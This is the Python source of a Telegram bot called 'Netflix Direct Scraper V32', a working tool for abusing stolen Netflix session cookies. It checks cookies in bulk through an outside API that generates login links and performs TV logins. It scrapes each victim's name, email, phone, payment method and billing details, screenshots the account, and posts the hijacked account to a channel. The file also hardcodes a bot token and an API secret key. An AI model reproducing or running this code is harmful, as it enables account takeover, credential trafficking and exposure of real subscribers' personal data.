import requests
import logging
import time
import urllib.parse
import io
import os
import sys
import re
import json
import threading
import telebot
import zipfile
import codecs
import concurrent.futures
from playwright.sync_api import sync_playwright
from telebot import types
from datetime import datetime, timedelta
import urllib3
from flask import Flask

# Suppress Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

user_modes = {}
BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
ADMIN_ID = 6176299339
CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
USERS_FILE = "users.txt"
SCREENSHOT_SEMAPHORE = threading.Semaphore(20) 

app = Flask(__name__)

@app.route('/')
def home():
    return "Stable Scraper is Running 24/7"

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False))
    t.daemon = True
    t.start()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

API_BASE_URL = "http://nftgenapi.onrender.com/api"
SECRET_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"

def get_flag(code):
    if not code or code == "Unknown" or len(code) != 2: return "🌍"
    return "".join([chr(ord(c.upper()) + 127397) for c in code])

def clean_text(text):
    if not text: return "Unknown"
    try: return codecs.decode(text, 'unicode_escape')
    except: return text

def extract_deep_details(html):
    details = {"plan": "Unknown", "email": "N/A", "country": "Unknown", "profiles": [], "status": "Dead", "member_since": "Unknown", "member_duration": "", "expiry": "N/A", "price": "Unknown", "payment": "Unknown", "quality": "Unknown", "name": "Unknown", "phone": "N/A", "extra_members": "No ❌"}
    try:
        if '"membershipStatus":"CURRENT_MEMBER"' in html: details["status"] = "Active"
        plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if plan_match: details["plan"] = clean_text(plan_match.group(1))
        price_match = re.search(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if price_match: details["price"] = clean_text(price_match.group(1))
        pm_match = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if pm_match: details["payment"] = clean_text(pm_match.group(1))
        qual_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if qual_match: details["quality"] = clean_text(qual_match.group(1))
        owner_match = re.search(r'"accountOwnerName":"([^"]+)"', html)
        if owner_match: details["name"] = clean_text(owner_match.group(1))
        phone_match = re.search(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"\}', html)
        if phone_match: details["phone"] = clean_text(phone_match.group(1))
        email_match = re.search(r'"email":"([^"]+)"', html)
        if email_match: details["email"] = clean_text(email_match.group(1))
        country_match = re.search(r'"currentCountry":"([^"]+)"', html)
        if country_match: details["country"] = country_match.group(1)
        since_match = re.search(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
        if since_match:
            ts = int(since_match.group(1)) / 1000 if int(since_match.group(1)) > 1e12 else int(since_match.group(1))
            dt = datetime.fromtimestamp(ts)
            details["member_since"] = dt.strftime('%Y-%m-%d')
            diff = datetime.now() - dt
            details["member_duration"] = f"({diff.days // 365}y {(diff.days % 365) // 30}m)"
        bill_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if bill_match: details["expiry"] = clean_text(bill_match.group(1))
        p_names = re.findall(r'"profileName":"([^"]+)"', html)
        details["profiles"] = list(set(p_names))
    except: pass
    return details

def call_api(endpoint, payload):
    try:
        payload["secret_key"] = SECRET_KEY
        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, timeout=15)
        return resp.json()
    except: return None

def parse_smart_cookie(c_in):
    c_in = c_in.strip()
    if c_in.startswith('['):
        try:
            for c in json.loads(c_in):
                if c.get('name') == 'NetflixId': return urllib.parse.unquote(c.get('value'))
        except: pass
    match = re.search(r"NetflixId=([^;]+)", c_in)
    return urllib.parse.unquote(match.group(1)) if match else c_in

def check_cookie(c_in):
    nid = parse_smart_cookie(c_in)
    api_res = call_api("gen", {"netflix_id": nid})
    if not api_res or not api_res.get("success"): return {"valid": False}
    
    session = requests.Session()
    session.cookies.set("NetflixId", nid, domain=".netflix.com")
    try:
        acc_resp = session.get("https://www.netflix.com/YourAccount", headers=HEADERS, timeout=12)
        deep_data = extract_deep_details(acc_resp.text)
        if deep_data["email"] == "N/A": deep_data["email"] = api_res.get("email", "N/A")
        
        screenshot_bytes = None
        if SCREENSHOT_SEMAPHORE.acquire(timeout=5):
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True)
                    ctx = browser.new_context()
                    ctx.add_cookies([{'name': 'NetflixId', 'value': nid, 'domain': '.netflix.com', 'path': '/'}])
                    pg = ctx.new_page()
                    pg.goto("https://www.netflix.com/browse", timeout=20000, wait_until='load')
                    screenshot_bytes = pg.screenshot(type='jpeg', quality=40)
                    browser.close()
            finally: SCREENSHOT_SEMAPHORE.release()
            
        return {"valid": True, "country": deep_data["country"], "link": api_res.get("login_url"), "data": deep_data, "screenshot": screenshot_bytes}
    except: return {"valid": True, "link": api_res.get("login_url"), "data": {"email": api_res.get("email", "N/A"), "status": "Active"}, "screenshot": None}

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("📩 Send Here (DM)", "📡 Send to Channel")
    kb.add("📺 TV Login", "🛑 Stop System")
    msg = ("**🔥 Netflix Direct Scraper V32**\n\n👋 **Welcome!** Choose mode below to begin.")
    bot.send_message(message.chat.id, msg, reply_markup=kb, parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text in ["📩 Send Here (DM)", "📡 Send to Channel", "🛑 Stop System"])
def handle_mode(message):
    uid = message.chat.id
    if message.text == "📩 Send Here (DM)":
        user_modes[uid] = {'target': uid, 'stop': False}
        bot.reply_to(message, "✅ **DM Mode Active.** Send cookies/file now.")
    elif message.text == "📡 Send to Channel":
        msg = bot.reply_to(message, "📡 **Enter Channel ID (e.g. -100xxx):**")
        bot.register_next_step_handler(msg, ch_verify)
    elif message.text == "🛑 Stop System":
        if uid in user_modes: user_modes[uid]['stop'] = True
        bot.reply_to(message, "🛑 **Scanning Stopped.**")

def ch_verify(message):
    try:
        cid = int(message.text.strip())
        chat = bot.get_chat(cid)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"set_{cid}"))
        bot.reply_to(message, f"📡 **Channel:** {chat.title}\nConfirm?", reply_markup=markup)
    except: bot.reply_to(message, "❌ Invalid ID or Not Admin.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("set_"))
def ch_callback(call):
    cid = int(call.data.split("_")[1])
    user_modes[call.message.chat.id] = {'target': cid, 'stop': False}
    bot.edit_message_text(f"✅ **Target Locked!**", call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda m: m.text == "📺 TV Login")
def tv_login(message):
    msg = bot.reply_to(message, "📺 **Send Netflix Cookie (Text only).**")
    bot.register_next_step_handler(msg, tv_process)

def tv_process(message):
    res = check_cookie(message.text)
    if not res.get("valid"): return bot.reply_to(message, "❌ **Dead Cookie.**")
    bot.reply_to(message, f"✅ **Valid!** e: {res['data']['email']}\n\nEnter **8-Digit TV Code**.")
    bot.register_next_step_handler(message, lambda m: tv_execute(m, parse_smart_cookie(message.text)))

def tv_execute(message, nid):
    api_res = call_api("tvlogin", {"netflix_id": nid, "tv_code": message.text.strip()})
    bot.reply_to(message, f"📺 **Result:** {api_res.get('message', 'Error')}")

@bot.message_handler(content_types=['document', 'text'])
def handle_bulk(message):
    uid = message.chat.id
    if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "📺 TV Login", "🛑 Stop System"]): return
    mode = user_modes.get(uid)
    if not mode: return bot.reply_to(message, "❌ **Select Mode first!**")
    
    cookies = []
    if message.content_type == 'document':
        file = bot.get_file(message.document.file_id)
        raw = bot.download_file(file.file_path).decode('utf-8', errors='ignore')
        cookies = [l.strip() for l in raw.splitlines() if len(l.strip()) > 30]
    else: cookies = [l.strip() for l in message.text.splitlines() if len(l.strip()) > 30]

    if not cookies: return bot.reply_to(message, "❌ **No Cookies found.**")
    status_msg = bot.reply_to(message, "⏳ **Checking...**")
    
    def background_task():
        total = len(cookies)
        hits = 0
        for i, c in enumerate(cookies, 1):
            if mode.get('stop'): break
            prog = int((i/total)*10)
            bar = "■"*prog + "□"*(10-prog)
            try: bot.edit_message_text(f"🚀 **Checking:** [{bar}] {int((i/total)*100)}%\nChecked: {i}/{total} | Hits: {hits}", uid, status_msg.message_id)
            except: pass
            
            res = check_cookie(c)
            if res.get("valid"):
                hits += 1
                send_hit(mode['target'], res)
        
        bot.delete_message(uid, status_msg.message_id)
        bot.send_message(uid, f"✅ **Complete!** Found {hits} Hits.")

    threading.Thread(target=background_task).start()

def send_hit(target, res):
    data = res['data']
    def esc(t): return str(t).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
    
    lines = []
    lines.append("🌟 **NETFLIX PREMIUM ULTRA HIT** 🌟")
    lines.append("")
    lines.append(f"🟢 **STATUS:** Active ✅")
    lines.append(f"🌍 **REGION:** {esc(res['country'])} {get_flag(res['country'])}")
    lines.append(f"⏰ **MEMBER SINCE:** {esc(data['member_since'])} {esc(data['member_duration'])}")
    lines.append(f"👤 **OWNER:** {esc(data['name'])}")
    lines.append(f"👑 **PLAN:** {esc(data['plan'])}")
    lines.append(f"📺 **QUALITY:** {esc(data['quality'])}")
    lines.append(f"💰 **PRICE:** {esc(data['price'])}")
    lines.append(f"💳 **PAYMENT:** {esc(data['payment'])}")
    lines.append(f"📅 **BILLING:** {esc(data['expiry'])}")
    lines.append(f"🎭 **PROFILES:** {', '.join(data['profiles'])}")
    lines.append(f"📧 **EMAIL:** {esc(data['email'])}")
    lines.append(f"☎️ **PHONE:** {esc(data['phone'])}")
    lines.append("")
    lines.append(f"💜 [CLICK HERE TO LOGIN]({res['link']}) 💜")
    lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("👨‍💻 **Admin:** @F88UF | 📢 **Channel:** @F88UF9844")
    
    msg = "\n".join(lines)
    if res['screenshot']:
        bot.send_photo(target, io.BytesIO(res['screenshot']), caption=msg, parse_mode='HTML')
    else: bot.send_message(target, msg, parse_mode='HTML')

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling(skip_pending=True)
    
